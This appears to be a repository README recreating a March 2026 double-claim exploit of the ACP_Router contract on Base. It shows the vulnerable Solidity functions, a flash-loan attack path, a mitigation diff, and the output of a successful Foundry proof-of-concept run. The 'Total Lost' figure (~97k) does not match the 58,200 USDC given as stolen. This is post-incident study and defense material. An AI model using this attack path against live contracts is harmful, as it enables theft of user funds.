# 2026-03-Recreate-ACP_Router-Exploit
Recreate a POC from ACP_Router exploit, which happen on 2nd March 2026. 

## KeyInfo 

- Total Lost                        : ~97k USDC

- Attacker                          : [0x79265e89FeAf7E971DEc75db1432795e6bd4b466](https://basescan.org/address/0x79265e89feaf7e971dec75db1432795e6bd4b466)

- Attack Contract                   : [0xE02219E6978C96cC25570087393b4436fa0079F6](https://basescan.org/address/0xe02219e6978c96cc25570087393b4436fa0079f6)

- Vulnerable Contract               : [ACP_Router Proxy](https://basescan.org/address/0xa6c9ba866992cfd7fd6460ba912bfa405ada9df0#readProxyContract)

- Attack Tx                         : [0xe94a5ed54d0a9aa317c997607d7d1ea9828ad47626d7794b0e4020ff49cdf9a0](https://skylens.certik.com/tx/base/0xe94a5ed54d0a9aa317c997607d7d1ea9828ad47626d7794b0e4020ff49cdf9a0?events_id=1665&events_jump=true)

- Type Vulnerable                   : Malicious Actor can double claim the budget, without `ACP_Router::claimBudget` checking claimed or not.


## Root cause

- Vulnerability name            : Logic / Double claim
   
- Protocol affected             : 58,200 USDC stolen (38,800USDC sent to treasury)
   
- Root cause                    : 
Attacker can double claim the job that created on ACP_Router. The first claim is called automatically when the job is finish trough signMemo(). And the second is called directly on the claimBudget() function on ACP_Router.

Below is the code which the attacker exploit it:
`ACP_Router::claimBudget`
```solidity
function claimBudget(uint256 jobId) external nonReentrant {
        require(address(jobManager) != address(0), "Job manager not set");
        
        ACPTypes.Job memory job = jobManager.getJob(jobId);
        
        // Check if job is expired
        if (job.phase < ACPTypes.JobPhase.TRANSACTION && block.timestamp > job.expiredAt) {
            jobManager.updateJobPhase(jobId, ACPTypes.JobPhase.EXPIRED);
        } else {
@>          _claimBudget(jobId);
        }
    }
```

`ACP_Router::_updateJobPhase` --> which is called on last `ACP_Router::signMemo`
```solidity
function _updateJobPhase(uint256 jobId, ACPTypes.JobPhase newPhase, bool isApproved) internal {
    // jobID, phase 4 ==> completed, isApproved true
        require(address(jobManager) != address(0), "Job manager not set");
        
        .
        .
        .
        .

        ACPTypes.JobPhase actualPhase = jobManager.getJob(jobId).phase; // this one should be updated ==> completed
        if (
            (oldPhase >= ACPTypes.JobPhase.TRANSACTION && oldPhase <= ACPTypes.JobPhase.EVALUATION) && // this one is EVALUATION
            (actualPhase == ACPTypes.JobPhase.COMPLETED || actualPhase == ACPTypes.JobPhase.REJECTED) // this one is COMPLETED
        ) {
            if (actualPhase == ACPTypes.JobPhase.REJECTED) {
                _claimRefund(jobId);
            } else {
@>              _claimBudget(jobId); // if completed then go to this claimBudget(jobId)
            }
        }

    }
```
   
- Broken invariant              : Can only claimBudget once
   
- Attack path (step-by-step)    : FlashLoan --> Create Job --> Create Memo(4x) --> Sign Memo(4x) --> Claim Budget --> Send Profit to EOA 
   
- Prevention / mitigation       : Add validation to check Claimed or not on `ACP_Router::claimBudget`

`ACP_Router::claimBudget`
```diff
function claimBudget(uint256 jobId) external nonReentrant {
        require(address(jobManager) != address(0), "Job manager not set");
        
        ACPTypes.Job memory job = jobManager.getJob(jobId);
        
        // Check if job is expired
        if (job.phase < ACPTypes.JobPhase.TRANSACTION && block.timestamp > job.expiredAt) {
            jobManager.updateJobPhase(jobId, ACPTypes.JobPhase.EXPIRED);
        } else {
+           require(!_checkClaimed(jobId), "Budget already Claimed !");
            _claimBudget(jobId);
        }
    }
```


## Link References
Post-mortem : none

Twitter Alert : 

[TenArmor](https://x.com/TenArmorAlert/status/2028652291151061214) 




To Run the POC please copy the `ACPRouter_exploit.t.sol` file to your Foundry project `test` folder
Dont forget to change your RPC URl too

and then run it on terminal with this command
`forge test --mp test/2026-03/ACPRouter/ACPRouter_exploit.t.sol -vv`

```
Ran 1 test for test/2026-03/ACPRouter/ACPRouter_exploit.t.sol:ACPRouter_Exploit
[PASS] test_acpRouterExploit() (gas: 3632869)
Logs:
  ------------------------------------------------------------------------
  [START] EOA ATTACKER USDC Balances: 0.000000
  ------------------------------------------------------------------------
  |
  1. Approve Token to Morpho so it can transfer the FlashLoan Borrowed Token
  |
  1. Do the flashloan to Morpho:  97000000000
  |
  1. Get to the callback 'onMorphoFlashLoan' 
  |
  1. Create new Contract as provider address  0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  |
  1. Create the Job with jobId:  1002573889
  |
  1. Creating memo from recently jobId with resulting memoId:  1008697571
  |
  1. Calling the provider address to sign the memo
  |
  1. After the phase finish till COMPLETED, the next job is to claimBudget with the jobId:  1002573889
  |
  1. During the claimBudget, the provider get the USDC:  155200000000
  |
  1.  Then the provider address sent back all the USDC to the evaluator, which is this contract:  0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
  |
  1.  The evaluator (aka the attacker contract) sent all the USDC to the EOA:  0x79265e89FeAf7E971DEc75db1432795e6bd4b466 with profit about  58200020000
  |
  ------------------------------------------------------------------------
  [FINISH] EOA ATTACKER USDC Balances: 58200.020000
  ------------------------------------------------------------------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 408.97ms (5.46ms CPU time)

Ran 1 test suite in 413.72ms (408.97ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```